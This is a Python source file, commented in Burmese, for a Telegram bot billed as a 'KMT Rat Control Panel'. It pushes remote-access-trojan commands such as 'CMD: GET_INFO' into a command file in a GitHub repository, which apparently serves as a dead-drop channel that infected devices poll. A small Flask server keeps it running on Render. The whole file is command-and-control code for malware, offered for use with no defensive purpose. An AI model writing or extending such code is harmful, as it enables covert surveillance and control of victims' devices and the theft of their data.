import os
import threading
import telebot
import requests
import base64
from flask import Flask

# 1. Flask App တည်ဆောက်ခြင်း (Render အတွက် Port 10000 လက်ခံရန်)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running live on Render!"

# 2. Telegram Bot သတ်မှတ်ချက်များ
TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
REPO_OWNER = "qqq1234ttttt"
REPO_NAME = "KMT-All-Software-Rat-Control"
FILE_PATH = "command.txt"

bot = telebot.TeleBot(TOKEN)

def update_github(command):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}", 
        "Accept": "application/vnd.github+json"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
        
        data = {
            "message": "Update command from Telegram Bot",
            "content": content_encoded,
            "sha": sha
        }
        requests.put(url, headers=headers, json=data)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn_device = telebot.types.InlineKeyboardButton("📱 Get Device Info", callback_data="get_device")
    markup.add(btn_device)
    bot.send_message(message.chat.id, "KMT Rat Control Panel - အောက်ပါခလုတ်ကို နှိပ်ပါ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_device":
        update_github("CMD: GET_INFO")
        bot.answer_callback_query(call.id, "Command Sent!")
        bot.send_message(call.message.chat.id, "📱 Device Info တောင်းဆိုသည့် အမိန့်ကို GitHub သို့ ပို့ပြီးပါပြီ။")

# 3. Telegram Bot ကို Background Thread ဖြင့် Run ခြင်း
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    # Bot ကို သီးသန့် Thread နဲ့ စတင်ခြင်း
    t = threading.Thread(target=run_bot)
    t.start()
    
    # Flask Server ကို Port 10000 ဖြင့် စတင်ခြင်း (Render အတွက်)
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
